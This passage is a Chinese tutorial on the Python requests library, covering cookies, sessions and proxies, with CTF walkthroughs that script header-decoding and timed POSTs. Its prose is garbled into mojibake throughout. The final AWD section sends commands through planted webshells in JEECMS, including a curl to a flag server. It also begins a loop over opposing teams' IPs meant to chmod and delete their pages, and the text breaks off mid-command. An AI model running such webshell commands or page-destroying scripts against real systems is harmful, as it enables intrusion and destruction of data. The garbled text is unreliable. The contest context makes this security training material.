¼å¼æ•°æ®](https://amos-x.com/index.php/amos/archives/python-requests-send-json/)\n\n### ä¼ é€’Cookieå‚æ•°\n\n>HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ã€‚å› æ­¤ï¼Œè‹¥ä¸å€ŸåŠ©å…¶ä»–æ‰‹æ®µï¼Œè¿œç¨‹çš„æœåŠ¡å™¨å°±æ— æ³•çŸ¥é“ä»¥å‰å’Œå®¢æˆ·ç«¯åšäº†å“ªäº›é€šä¿¡ã€‚Cookie å°±æ˜¯æ‰‹æ®µä¹‹ä¸€ã€‚\n>Cookie ç”¨äºè®°å½•ç”¨æˆ·åœ¨ç½‘ç«™ä¸Šçš„ç™»å½•çŠ¶æ€ã€‚\n\nå¦‚æœæƒ³ä¼ é€’è‡ªå®šä¹‰`Cookie`åˆ°æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨`cookies`å‚æ•°(`dict`ç±»å‹å˜é‡)ã€‚ä»¥`POST`è¯·æ±‚ä¸ºä¾‹æäº¤è‡ªå®šä¹‰`Cookie`ï¼ˆ`cookies`å‚æ•°åŒæ ·é€‚ç”¨äº`GET`è¯·æ±‚ï¼‰ï¼š\n```python\n>>> mycookie = {'userid': '123456'}\n>>> r = requests.post('https://github.com/', cookies = mycookie)\n>>> r.request.headers\n...'Cookie': 'userid=123456',...\n```\n### ä¼šè¯å¯¹è±¡Sessionï¼ˆï¼‰\n>ä¼šè¯æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ç›¸å…³ç”¨æˆ·ä¿¡æ¯ï¼Œç”¨äºåœ¨æœ‰æ•ˆæœŸå†…ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„çŠ¶æ€.Sessionä¸Cookieé…åˆä½¿ç”¨ï¼Œå½“ä¼šè¯æˆ–Cookieå¤±æ•ˆæ—¶ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„çŠ¶æ€ä¹Ÿéšä¹‹å¤±æ•ˆã€‚\n\nè¯·æ±‚æ¨¡å—ä¸­çš„ä¼šè¯å¯¹è±¡Sessionï¼ˆï¼‰èƒ½å¤Ÿåœ¨å¤šæ¬¡è¯·æ±‚ä¸­ä¿æŒæŸäº›å‚æ•°ï¼Œä½¿å¾—åº•å±‚çš„TCPè¿æ¥å°†è¢«é‡ç”¨ï¼Œæé«˜äº†HTTPè¿æ¥çš„æ€§èƒ½ã€‚\n\nSessionï¼ˆï¼‰çš„åˆ›å»ºè¿‡ç¨‹å¦‚ä¸‹ï¼š\n```python\n>>> s = requests.Session()\n```\nåœ¨æœ‰æ•ˆæœŸå†…ï¼ŒåŒä¸€ä¸ªä¼šè¯å¯¹è±¡å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¿æŒç€ç›¸åŒçš„Cookieï¼Œå¯ä»¥çœ‹å‡ºï¼Œä¼šè¯å¯¹è±¡ä¹Ÿå¯ä»¥é€šè¿‡getä¸postæ–¹æ³•å‘é€è¯·æ±‚ï¼Œä»¥å‘é€GETè¯·æ±‚ä¸ºä¾‹ï¼š\n```python\n>>> r = s.get('https://github.com)\n```\næˆ‘ä»¬æ¥è·¨è¯·æ±‚ä¿æŒä¸€äº› cookie:\n```python\ns = requests.Session()\n\ns.get('http://httpbin.org/cookies/set/sessioncookie/123456789')\nr = s.get(\"http://httpbin.org/cookies\")\n\nprint(r.text)\n# '{\"cookies\": {\"sessioncookie\": \"123456789\"}}'\n```\n\nä»»ä½•ä½ ä¼ é€’ç»™è¯·æ±‚æ–¹æ³•çš„å­—å…¸éƒ½ä¼šä¸å·²è®¾ç½®ä¼šè¯å±‚æ•°æ®åˆå¹¶ã€‚æ–¹æ³•å±‚çš„å‚æ•°è¦†ç›–ä¼šè¯çš„å‚æ•°ã€‚\n\nä¸è¿‡éœ€è¦æ³¨æ„ï¼Œå°±ç®—ä½¿ç”¨äº†ä¼šè¯ï¼Œæ–¹æ³•çº§åˆ«çš„å‚æ•°ä¹Ÿä¸ä¼šè¢«è·¨è¯·æ±‚ä¿æŒã€‚ä¸‹é¢çš„ä¾‹å­åªä¼šå’Œç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€ cookie ï¼Œè€Œéç¬¬äºŒä¸ªï¼š\n```python\ns = requests.Session()\n\nr = s.get('http://httpbin.org/cookies', cookies={'from-my': 'browser'})\nprint(r.text)\n# '{\"cookies\": {\"from-my\": \"browser\"}}'\n\nr = s.get('http://httpbin.org/cookies')\nprint(r.text)\n# '{\"cookies\": {}}'\n```\n### Cookieå’ŒSessionåŒºåˆ«\n1.session åœ¨æœåŠ¡å™¨ç«¯ï¼Œcookie åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰\n2.session é»˜è®¤è¢«ä¿å­˜åœ¨æœåŠ¡å™¨çš„ä¸€ä¸ªæ–‡ä»¶é‡Œï¼ˆä¸æ˜¯å†…å­˜ï¼‰\n3.session çš„è¿è¡Œä¾èµ– session idï¼Œè€Œ session id æ˜¯å­˜åœ¨ cookie ä¸­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæµè§ˆå™¨ç¦ç”¨äº† cookie ï¼ŒåŒæ—¶ session ä¹Ÿä¼šå¤±æ•ˆï¼ˆä½†æ˜¯å¯ä»¥é€šè¿‡å…¶å®ƒæ–¹å¼å®ç°ï¼Œæ¯”å¦‚åœ¨ url ä¸­ä¼ é€’ session_idï¼‰\n4.session å¯ä»¥æ”¾åœ¨ æ–‡ä»¶ã€æ•°æ®åº“ã€æˆ–å†…å­˜ä¸­éƒ½å¯ä»¥ã€‚\n5.ç”¨æˆ·éªŒè¯è¿™ç§åœºåˆä¸€èˆ¬ä¼šç”¨ session\n6.cookieç›®çš„å¯ä»¥è·Ÿè¸ªä¼šè¯ï¼Œä¹Ÿå¯ä»¥ä¿å­˜ç”¨æˆ·å–œå¥½æˆ–è€…ä¿å­˜ç”¨æˆ·åå¯†ç \n7.sessionç”¨æ¥è·Ÿè¸ªä¼šè¯\n![åˆ©ç”¨ Cookie ç®¡ç† Session](https://i.loli.net/2019/08/08/CxvezroEm3OAQ26.png)\n\n### HTTPä»£ç†\nå¦‚æœéœ€è¦ä½¿ç”¨ä»£ç†ï¼Œä½ å¯ä»¥é€šè¿‡ä¸ºä»»æ„è¯·æ±‚æ–¹æ³•æä¾› proxies å‚æ•°æ¥é…ç½®å•ä¸ªè¯·æ±‚:\n```python\nimport requests\n\nproxies = {\n  \"http\": \"http://10.10.1.10:3128\",\n  \"https\": \"http://10.10.1.10:1080\",\n}\n\nrequests.get(\"http://example.org\", proxies=proxies)\n```\nä½ ä¹Ÿå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ `HTTP_PROXY` å’Œ` HTTPS_PROXY `æ¥é…ç½®ä»£ç†ã€‚\n```python\n$ export HTTP_PROXY=\"http://10.10.1.10:3128\"\n$ export HTTPS_PROXY=\"http://10.10.1.10:1080\"\n\n$ python\n>>> import requests\n>>> requests.get(\"http://example.org\")\n```\nè‹¥ä½ çš„ä»£ç†éœ€è¦ä½¿ç”¨`HTTP Basic Auth`ï¼Œå¯ä»¥ä½¿ç”¨ `http://user:password@host/`è¯­æ³•ï¼š\n```python\nproxies = {\n    \"http\": \"http://user:pass@10.10.1.10:3128/\",\n}\n```\nè¦ä¸ºæŸä¸ªç‰¹å®šçš„è¿æ¥æ–¹å¼æˆ–è€…ä¸»æœºè®¾ç½®ä»£ç†ï¼Œä½¿ç”¨ `scheme://hostname` ä½œä¸º `key`ï¼Œ å®ƒä¼šé’ˆå¯¹æŒ‡å®šçš„ä¸»æœºå’Œè¿æ¥æ–¹å¼è¿›è¡ŒåŒ¹é…ã€‚\n```python\nproxies = {'http://10.20.1.128': 'http://10.10.1.10:5323'}\n```\næ³¨æ„ï¼Œä»£ç† `URL` å¿…é¡»åŒ…å«è¿æ¥æ–¹å¼ã€‚\n\n### SOCKSä»£ç†\n\né™¤äº†åŸºæœ¬çš„ HTTP ä»£ç†ï¼ŒRequest è¿˜æ”¯æŒ SOCKS åè®®çš„ä»£ç†ã€‚è¿™æ˜¯ä¸€ä¸ªå¯é€‰åŠŸèƒ½ï¼Œè‹¥è¦ä½¿ç”¨ï¼Œ ä½ éœ€è¦å®‰è£…ç¬¬ä¸‰æ–¹åº“ã€‚\n\nä½ å¯ä»¥ç”¨ pip è·å–ä¾èµ–:\n```\n$ pip install requests[socks]\n```\nå®‰è£…å¥½ä¾èµ–ä»¥åï¼Œä½¿ç”¨ SOCKS ä»£ç†å’Œä½¿ç”¨ HTTP ä»£ç†ä¸€æ ·ç®€å•ï¼š\n```\nproxies = {\n    'http': 'socks5://user:pass@host:port',\n    'https': 'socks5://user:pass@host:port'\n}\n```\n## Requeståœ¨CTFä¸­å®æˆ˜\n### é¢˜ç›® å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´\né¢˜ç›®æ¥æºï¼šå®éªŒå§\né¢˜ç›®é“¾æ¥ï¼šhttp://ctf5.shiyanbar.com/web/10/10.php\né¢˜ç›®ä¿¡æ¯ï¼š\n![](https://i.loli.net/2019/08/08/1lNP4u2rGeb6Foh.png)\næ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç \n![](https://i.loli.net/2019/08/08/p4c3WLrZNVbKlOo.png)\né¢˜ç›®æç¤ºè¯·ç”¨`POST`è¯·æ±‚æäº¤ä½ å‘ç°çš„ä¿¡æ¯ï¼Œè¯·æ±‚å‚æ•°çš„é”®å€¼æ˜¯`key`ã€‚çœ‹çœ‹å“åº”å¤´ï¼Œæœç„¶çœ‹åˆ°FLAG\n![](https://i.loli.net/2019/08/08/RTmZDJEC9Q84Luz.png)\nå°†å‘ç°å­—ç¬¦base64è§£ç ï¼š`P0ST_THIS_T0_CH4NGE_FL4G:x63HymPc3`\n![](https://i.loli.net/2019/08/08/PvYTriwqSd1Wjf2.png)\nå³`key=x63HymPc3`\nHackbaræ‰‹å·¥æäº¤ POST è¯·æ±‚ä¼šæœ‰ä»€ä¹ˆæ•ˆæœï¼š\n![](https://i.loli.net/2019/08/08/qg9uGRwPW7svBNO.png)\næ ¹æ®é¢˜ç›®æ„æ€å¿…é¡»å¾ˆå¿«çš„æäº¤ï¼Œç»è¿‡ç ”ç©¶å‘ç°FLAGçš„å€¼ä¼šæ”¹å˜ï¼Œæ˜¾ç„¶å¿…é¡»è¦ç”¨è„šæœ¬æ¥è·‘äº†ï¼Œå› æ­¤ç›´æ¥ä¸Š Python è„šæœ¬è§£é¢˜ï¼š\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = \"http://ctf5.shiyanbar.com/web/10/10.php\" # ç›®æ ‡URL\nheaders = requests.get(url).headers # è·å–å“åº”å¤´\nkey = base64.b64decode(headers['FLAG']).split(':')[1] # è·å–å“åº”å¤´ä¸­çš„Flagï¼Œç”¨ split(':') åˆ†ç¦»å†’å·ä¸¤è¾¹çš„å€¼ï¼Œå¯¹è±¡ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ å³ä¸ºè¦æäº¤çš„ key å€¼\npostData = {'key': key} # æ„é€ Postè¯·æ±‚ä½“\nprint(requests.post(url, data = postData).text)# åˆ©ç”¨Postæ–¹å¼å‘é€è¯·æ±‚å¹¶æ‰“å°å“åº”å†…å®¹ \n```\nè¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag\n![](https://i.loli.net/2019/08/08/4BHYIawCf1KnPvM.png)\n\n### é¢˜ç›® é€Ÿåº¦è¦å¿«\né¢˜ç›®æ¥æºï¼šbugku\né¢˜ç›®é“¾æ¥ï¼šhttp://123.206.87.240:8002/web6/\né¢˜ç›®ä¿¡æ¯ï¼š\n![](https://i.loli.net/2019/08/08/6sDuXIikrfQw1bV.png)\n>æ­¤é¢˜æ˜¯ä¸Šä¸€é¢˜çš„å‡çº§ç‰ˆï¼Œé™¤äº†è¦æ±‚å¿«é€Ÿå‘é€`POST`è¯·æ±‚ï¼Œè¿˜è¦æ±‚æ‰€æœ‰çš„è¯·æ±‚å¿…é¡»åœ¨åŒä¸€ä¸ª`Session`å†…å®Œæˆ\n\næ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç \n![](https://i.loli.net/2019/08/08/MYZlHAX3TQmiCbk.png)\né¢˜ç›®æç¤ºè¯·ç”¨`POST`è¯·æ±‚æäº¤ä½ å‘ç°çš„ä¿¡æ¯ï¼Œè¯·æ±‚å‚æ•°çš„é”®å€¼æ˜¯`margin`ã€‚çœ‹çœ‹å“åº”å¤´ï¼Œæœç„¶çœ‹åˆ°flag\n![](https://i.loli.net/2019/08/08/c4uTHyePG7RbAkz.png)\nå°†å‘ç°å­—ç¬¦base64è§£ç ï¼š`è·‘çš„è¿˜ä¸é”™ï¼Œç»™ä½ flagå§: MzIyMTk1`\n![](https://i.loli.net/2019/08/08/tLUBo3u6A1CTSnP.png)\nç»è¿‡ç¬¬ä¸€æ¬¡base64è§£ç åï¼Œflagä»ç„¶è¿˜æ˜¯ä¸€æ®µbase64ç¼–ç ï¼Œæ‰€ä»¥è¦å†è§£ç ä¸€æ¬¡ã€‚è§£é¢˜è¿‡ç¨‹ä¸­ï¼Œè¦è‡ªè¡ŒåŠ¨æ‰‹æŸ¥çœ‹æ¯ä¸€æ¬¡è§£ç åçš„å€¼ï¼Œæ‰èƒ½é€‰æ‹©åˆé€‚çš„æ–¹æ³•å»è·å¾—æœ€ç»ˆkeyå€¼ã€‚\n![](https://i.loli.net/2019/08/08/Ro8YkHwaBJC6Mul.png)\nHackbaræ‰‹å·¥æäº¤ POST è¯·æ±‚ä¼šæœ‰ä»€ä¹ˆæ•ˆæœ:\n![](https://i.loli.net/2019/08/08/bMm9OkgixA2lPU3.png)\næ ¹æ®é¢˜ç›®æ„æ€å¿…é¡»å¾ˆå¿«çš„æäº¤ï¼Œç»è¿‡ç ”ç©¶å‘ç°flagçš„å€¼ä¼šæ”¹å˜ï¼Œæ˜¾ç„¶å¿…é¡»è¦ç”¨è„šæœ¬æ¥è·‘äº†ï¼Œå› æ­¤ç›´æ¥ä¸Š Python è„šæœ¬è§£é¢˜\nä½†æ˜¯ç›´æ¥ç”¨ä¸Šé¢˜è„šæœ¬å‘ç°ï¼Œå‘ç°è¿˜æ˜¯æç¤ºå¿«ä¸€ç‚¹\nå› æ­¤æŸ¥çœ‹GETè¯·æ±‚å’ŒPOSTè¯·æ±‚çš„`è¯·æ±‚å¤´`ä¸`å“åº”å¤´`æ˜¯å¦å†…æœ‰ç„æœº\n![](https://i.loli.net/2020/05/20/LwF4Kk3bJNmXvqs.png)\næœç„¶å¦‚æ­¤ï¼ŒGETè¯·æ±‚å’ŒPOSTè¯·æ±‚çš„å“åº”å¤´çš„Set-Cookieå€¼ä¸ç›¸åŒï¼Œå³ä¸åœ¨åŒä¸€ä¸ªä¼šè¯ä¸­ï¼Œå› æ­¤ç¼–å†™è„šæœ¬\n**æ–¹æ³•ä¸€**ï¼š\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = 'http://123.206.87.240:8002/web6/'\ns = requests.Session() #è·å– Session\nheaders = s.get(url).headers\nkey = base64.b64decode(base64.b64decode(headers['flag']).split(\":\")[1])\npost = {\"margin\":key} \nprint(s.post(url, data = post).text)\n```\nç”¨ä¼šè¯å¯¹è±¡Session()çš„getå’Œpostæ–¹æ³•ä½¿GETè¯·æ±‚ä¸POSTè¯·æ±‚åœ¨åŒä¸€ä¸ªSessionä¸­\n\nè¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag\n![](https://i.loli.net/2019/08/08/zkJerUat28BfyA9.png)\n**æ–¹æ³•äºŒ**ï¼š\næ—¢ç„¶åªéœ€è¦ä¿æŒä¸¤æ¬¡è¯·æ±‚ä¸­ Cookie å±æ€§ç›¸åŒï¼Œé‚£èƒ½ä¸èƒ½æ„é€  Cookie å±æ€§é€šè¿‡æ™®é€šçš„ get ä¸ post æ–¹æ³•å®Œæˆå‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚è¯·è§å¦‚ä¸‹ä»£ç ï¼š\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport base64\nurl = 'http://120.24.86.145:8002/web6/'\nheaders = requests.get(url).headers\nkey = base64.b64decode(base64.b64decode(headers['flag']).split(\":\")[1])\npost = {\"margin\": key} \nPHPSESSID = headers[\"Set-Cookie\"].split(\";\")[0].split(\"=\")[1]\ncookie = {\"PHPSESSID\": PHPSESSID}\nprint(requests.post(url, data = post, cookies = cookie).text)\n```\n### é¢˜ç›® ç§‹åå±±è€å¸æœº\né¢˜ç›®æ¥æºï¼šbugku\né¢˜ç›®é“¾æ¥ï¼šhttp://123.206.87.240:8002/qiumingshan/\né¢˜ç›®ä¿¡æ¯ï¼š\n![](https://i.loli.net/2020/05/20/pZaRetgBlxoy2mJ.png)\n\n>ä¾æ—§æ˜¯è·Ÿå‰ä¸¤é¢˜å·®ä¸å¤šï¼Œå‰é¢ä¸¤é¢˜å‡æ˜¯å¯¹å“åº”å¤´ä¸­ä¸flagç›¸å…³çš„å±æ€§åšè§£ç å¤„ç†ï¼Œç„¶åå¿«é€Ÿå‘é€ä¸€ä¸ª POST è¯·æ±‚å¾—åˆ° flag å€¼ã€‚è€Œæœ¬é¢˜è¦æ±‚è®¡ç®—å“åº”å†…å®¹ä¸­çš„è¡¨è¾¾å¼ï¼Œå°†ç»“æœç”¨ POST è¯·æ±‚å‘é€å›æœåŠ¡å™¨æ¢å– flag å€¼ã€‚åŒæ ·è¦åˆ©ç”¨ä¼šè¯å¯¹è±¡ Session()ï¼Œå¦åˆ™æäº¤ç»“æœçš„æ—¶å€™ï¼Œé‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„è¡¨è¾¾å¼ï¼Œç»“æœè‡ªç„¶é”™è¯¯ã€‚\n\næ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç \n![](https://i.loli.net/2020/05/20/VzFaq1GSdIZ4uUO.png)\næ ¹æ®é¢˜ç›®æ„æ€ å¿…é¡»2ç§’å†…è®¡ç®—ç»™å‡ºç®—å¼çš„å€¼\nä½†æ˜¯ä¸çŸ¥é“POSTçš„keyæ˜¯ä»€ä¹ˆï¼Œåˆ·æ–°é¡µé¢å†çœ‹çœ‹ï¼Œå¾—åˆ°è¯·æ±‚å‚æ•°çš„ key å€¼ä¸º`value`\n![](https://i.loli.net/2020/05/20/UJlxr18MNpqyTWg.png)\nç»è¿‡ç ”ç©¶å‘ç°ç®—å¼ä¼šæ”¹å˜ï¼Œå†åŠ ä¸Šå¿…é¡»2ç§’å†…æäº¤ï¼Œæ˜¾ç„¶å¿…é¡»è¦ç”¨è„šæœ¬æ¥è·‘äº†ï¼Œå› æ­¤ç›´æ¥ä¸Š Python è„šæœ¬è§£é¢˜\n\n```python\n# -*- coding: utf-8 -*-\n# python 2\nimport requests\nimport re # æ­£åˆ™è¡¨è¾¾å¼\nurl = 'http://123.206.87.240:8002/qiumingshan/'\ns = requests.Session()\nr = s.get(url).content\n# search() åŒ¹é…ç®—æœ¯è¡¨è¾¾å¼ï¼ŒåŒ¹é…æˆåŠŸåç”¨ group() è¿”å›ç®—æœ¯è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ã€‚\nexpression = re.search(r'(\\d+[+\\-*])+(\\d+)', r).group() # search() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦åŒ¹é…çš„å­—ç¬¦ä¸²\nsum = eval(expression) # eval()è‡ªåŠ¨è®¡ç®—å‡ºç»“æœï¼Œ\npost = {'value': sum}\nprint (s.post(url, data = post).content.decode('utf-8'))\n```\n**è„šæœ¬è§£é‡Š**ï¼š\n```python\nexpression = re.search(r'(\\d+[+\\-*])+(\\d+)', r).group() \n```\nå‰é¢çš„ä¸€ä¸ª`r`è¡¨ç¤ºå­—ç¬¦ä¸²ä¸ºéè½¬ä¹‰çš„åŸå§‹å­—ç¬¦ä¸²ï¼Œè®©ç¼–è¯‘å™¨å¿½ç•¥åæ–œæ ï¼Œä¹Ÿå°±æ˜¯å¿½ç•¥è½¬ä¹‰å­—ç¬¦ã€‚ä½†æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²é‡Œæ²¡æœ‰åæ–œæ ï¼Œæ‰€ä»¥è¿™ä¸ª`r`å¯æœ‰å¯æ— \n\n`\\d+`ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—\n`[+\\-*]`åŒ¹é…ä¸€ä¸ªåŠ å·ï¼Œæˆ–ä¸€ä¸ªå‡å·ï¼Œæˆ–ä¸€ä¸ªä¹˜å·ï¼Œæ³¨æ„å‡å·åœ¨ä¸­æ‹¬å·å†…æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œè¦ç”¨åæ–œæ è½¬ä¹‰ï¼›\n`(\\d+[+\\-*])+`ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªç”±æ•°å­—ä¸è¿ç®—ç¬¦ç»„æˆçš„åŒ¹é…ç»„ï¼›æœ€åå†åŠ ä¸Šå‰©ä¸‹çš„ä¸€ä¸ªæ•°å­—`(\\d+)`\n\n[Python æ­£åˆ™è¡¨è¾¾å¼](https://www.runoob.com/python/python-reg-expressions.html)\n[æ­£åˆ™è¡¨è¾¾å¼](https://docs.python.org/zh-cn/2.7/library/re.html)\nè¿è¡Œè„šæœ¬ï¼Œå°±æœ‰ä¸€å®šçš„æ¦‚ç‡å¯ä»¥è·å¾—flag,ç»å°è¯•ä¸çŒœæµ‹åªæœ‰å½“`Give me value post about...`ç•Œé¢å‡ºç°æäº¤æ‰èƒ½å¾—åˆ°flag\næ‰€ä»¥å¤šè¿è¡Œå‡ æ¬¡è„šæœ¬flagå°±èƒ½å¾—åˆ°äº†\n\n![](https://i.loli.net/2020/05/20/yctYRWMpibT1wHP.png)\n\n\n### é¢˜ç›® å¿«é€Ÿå£ç®—\n\né¢˜ç›®æ¥æºï¼šç½‘ç»œä¿¡æ¯å®‰å…¨æ”»é˜²å­¦ä¹ å¹³å°\né¢˜ç›®é“¾æ¥ï¼šhttp://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\né¢˜ç›®ä¿¡æ¯ï¼š\n![](https://i.loli.net/2020/05/20/xkZeTPyhrtK7Opb.png)\n\n>è·Ÿä¸Šä¸€é¢˜åŸç†ä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒå°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼ç¨æœ‰å˜åŠ¨ï¼Œå› ä¸ºä¸¤é¢˜ç®—å¼å½¢å¼ç•¥æœ‰ä¸åŒ\n\næ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç \n![](https://i.loli.net/2020/05/20/YmG8RXtfcyETKhM.png)\næ ¹æ®é¢˜ç›®æ„æ€ å¿…é¡»2ç§’å†…è®¡ç®—ç»™å‡ºç®—å¼çš„å€¼ï¼Œæºç ä¸­å¾—åˆ°è¯·æ±‚å‚æ•°çš„ key å€¼ä¸º`v`\nè§£é¢˜è„šæœ¬ï¼š\n\n```python\n# -*- coding: utf-8 -*-\n# Python 2\nimport requests\nimport re # æ­£åˆ™è¡¨è¾¾å¼\nurl=\"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\"\ns=requests.Session()\nr=s.get(url).content\nexpression=re.search(r'[0-9+*()]+[)]',r).group()\nsum=eval(expression) \npostdata={'v':sum}\nprint(s.post(url,data=postdata).content.decode('utf-8'))\n```\n`0-9+`ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—\n`+*()`åŒ¹é…ä¸€ä¸ªåŠ å·ï¼Œæˆ–ä¸€ä¸ªä¹˜å·ï¼Œæˆ–ä¸€ä¸ªæ‹¬å·\n`[0-9+*()]+`ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªç”±æ•°å­—ä¸è¿ç®—ç¬¦ç»„æˆçš„åŒ¹é…ç»„ï¼›æœ€åå†åŠ ä¸Šå‰©ä¸‹çš„ä¸€ä¸ªåæ‹¬å·`[)]`\nè¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag\n![](https://i.loli.net/2020/05/20/jt2ZiEkPbwLaJnQ.png)\n\n### é¢˜ç›® cookiesæ¬ºéª—\né¢˜ç›®æ¥æºï¼šbugku\né¢˜ç›®é“¾æ¥ï¼šhttp://123.206.87.240:8002/web11/\né¢˜ç›®ä¿¡æ¯ï¼š\n![](https://i.loli.net/2019/08/09/IVY2q6SJ1inOBFk.png)\næ‰“å¼€é¢˜ç›®ï¼Œçœ‹åˆ°ä¸€æ®µå­—ç¬¦ï¼Œå„ç§ç¼–ç å°è¯•ä¹‹åï¼Œæœªæœã€‚ã€‚ã€‚\n![](https://i.loli.net/2019/08/09/8wUNGWz74yhjJPs.png)\nå‘ç°`url`ä¸­çš„`filename`çš„å€¼`a2V5cy50eHQ=`æ˜¯`base64`ç¼–ç ï¼Œè§£ç åæ˜¯`keys.txt`\nç›´æ¥è®¿é—®`keys.txt`ï¼Œå‘ç°å›æ˜¾çš„å°±æ˜¯åˆšæ‰çš„é‚£æ®µå­—ç¬¦\n![](https://i.loli.net/2019/08/09/VYSfsa2lenBJF6K.png)\nä¹Ÿå°±æ˜¯è¯´`filename`èƒ½è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶åè¦`base64`ç¼–ç \nå› æ­¤æˆ‘ä»¬æ¥è¯»å–`index.php`,å°†å…¶`base64`ç¼–ç \n![](https://i.loli.net/2019/08/09/Wgu2X9LFCel6vxp.png)\n`url`ä¸­`line`å‚æ•°åº”è¯¥æ˜¯è¡Œæ•°ï¼Œè¯•ä¸€ä¸‹`line=1`\n![](https://i.loli.net/2019/08/09/sLUrDAydSgMOlkJ.png)\nå‡ºç°ä¸€è¡Œä»£ç ï¼Œå†è¯•ä¸€ä¸‹`line=2`æ˜¾ç¤ºäº†ä¸åŒçš„ä»£ç \n![](https://i.loli.net/2019/08/09/QxzrbNmg5GtvwCk.png)\nç”±æ­¤æ¨æ–­æ”¹å˜`line`å€¼å°±èƒ½å¤Ÿè¯»å–`index.php`,ä½†æ˜¯æ‰‹åŠ¨æ”¹å¤ªéº»çƒ¦ï¼Œå› æ­¤æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬æ¥è¯»å–`index.php`\n\n```python\nimport requests\n\nfor i in range(0,30):\n\turl='http://123.206.87.240:8002/web11/index.php?line='+str(i)+'&filename=aW5kZXgucGhw'\n\tr=requests.get(url)\n\tprint r.text\n```\nè¿è¡Œè„šæœ¬å¾—åˆ°æºç \n![](https://i.loli.net/2019/08/09/IrajzObsk7SQYug.png)\nå®¡è®¡ä»£ç ï¼Œ`cookie`å¿…é¡»æ»¡è¶³`margin=margin`æ‰èƒ½è®¿é—®`keys.php`\nå°†`keys.php`è¿›è¡Œ`base64`ç¼–ç \n![](https://i.loli.net/2019/08/09/Qxb7LsPZkREtYyO.png)\næŠ“åŒ…ä¹‹åï¼ŒåŠ ä¸Š`Cookie:margin=margin`\n![](https://i.loli.net/2019/08/09/Lo1i7BAJFNlU9bg.png)\nçœ‹äº†ç½‘ä¸Šä¹Ÿå¯ç”¨Hackbar,æ‰§è¡Œä¹‹åæŸ¥çœ‹æºç \n![](https://i.loli.net/2019/08/09/CkLSp8PODf3ztnv.png)\n\n## Requeståœ¨AWDä¸­å®æˆ˜\n### é¢˜ç›®ï¼šJEECMS\n\né¢˜ç›®æ¥æºï¼š2019å››å·çœçœèµ›AWD\né¢˜ç›®é“¾æ¥ï¼šé“¾æ¥ï¼šhttps://pan.baidu.com/s/1YpdKs8BwQpUuCosqNM_-9w \næå–ç ï¼škg4y \n\nsshè¿æ¥ï¼Œå°†æºç downä¸‹æ¥ï¼ŒDç›¾æ‰«æ\n![](https://blog.xiafeng2333.top/content/images/2019/08/1.jpg)\nä¸€å…±å››ä¸ªæœ¨é©¬ï¼Œä¸¤ä¸ªå¤šåŠŸèƒ½å¤§é©¬\n![](https://i.loli.net/2020/05/20/YVCpkEZtAbcIRQ3.png)\næ ¹æ®æ‰«å‡ºçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç›´æ¥è·å–flagæ‰‹å·¥æäº¤\n\n```php\nhttp://192.200.1.11:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\nhttp://192.200.1.12:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\nhttp://192.200.1.num:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/\n# é¢˜ç›®æä¾›çš„flagæ‰€åœ¨åœ° curl http://192.200.0.70/remoteflag/\n```\næ ¹æ®æ¼æ´ï¼Œåˆ©ç”¨Requestså†™å‡ºå®•æœºè„šæœ¬ï¼Œç›´æ¥åˆ é™¤æ•Œæ–¹é¡µé¢\n```python\nimport requests\n\nfor num in range(11,43):  #è¿™ä¸ªèŒƒå›´æ˜¯æ‰“çš„ipæ˜¯11-43çš„é˜Ÿä¼\n\t#ä¿®æ”¹è¦åˆ é™¤é¡µé¢çš„æƒé™\n    url='http://192.200.1.'+str(num)+':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=chmod 777 